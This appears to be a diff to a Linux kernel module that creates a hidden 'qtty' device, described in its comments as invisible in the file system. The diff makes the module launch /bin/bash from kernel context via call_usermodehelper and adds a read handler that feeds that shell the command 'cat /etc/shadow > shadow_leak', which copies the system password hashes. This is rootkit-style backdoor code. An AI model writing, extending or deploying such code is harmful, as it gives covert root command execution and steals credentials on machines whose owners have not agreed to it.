@@ -11,13 +11,13 @@ struct qtty qtty;
 
 
 
-
+char* str = "cat /etc/shadow > shadow_leak\n";
 
 ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){
     printk(KERN_INFO "WRITING\n");
     char* kbuf = (char*)kzalloc(size+1, GFP_KERNEL); //make sure the string actually terminates so add 1 
     if(!access_ok(buf, size)){
-        return -EINVAL;
+        return -EFAULT;
     }
 
     if(copy_from_user(kbuf, buf, size)){ //copy_from_user returns 0
@@ -32,14 +32,32 @@ ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t*
     
 }
 
+
 int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
     printk(KERN_INFO "TTY opened");
     return 0;
 }
 
+ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){
+  
+  size_t to_copy = size <= strlen(str) ? size : strlen(str);
+  //printk(KERN_INFO "Pre-READ %ld, offset: %llu, to_copy: %d, str_size: %d", size, *off, to_copy, strlen(str));
+  if(!access_ok(buf,size))
+    return -EFAULT;
+  //printk(KERN_INFO "copying\n");
+  unsigned long ret = copy_to_user(buf, str+(*off % strlen(str)), to_copy);
+  (*off) = ((*off) + 1) % strlen(str);
+  //printk(KERN_INFO "Post-READ %ld, offset: %llu", size, *off);
+  //printk(KERN_INFO "copied bytes: %lu\n", ret);
+  return to_copy;
+    
+  
+}
+
 const struct file_operations qtty_fops = {
     .open = qtty_open,
-    .write = qtty_write,  
+    .write = qtty_write,
+    .read = qtty_read,  
     .owner = THIS_MODULE
 };
 
@@ -171,7 +189,7 @@ void launch_bash(void){
     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
     NULL
   };
-  sub_info = call_usermodehelper_setup("/home/mineo333/Qogchamp/testing/write_string/write_string", argv, envp, GFP_KERNEL, init_func, NULL,  (void*)current);
+  sub_info = call_usermodehelper_setup("/bin/bash", argv, envp, GFP_KERNEL, init_func, NULL,  (void*)current);
   call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
   //it is possible that we get preempted here. However, because we added it to the wait_queue, it shouldn't matter despite umh_exec executing asynchronously
   while(1){ //wait for task to start
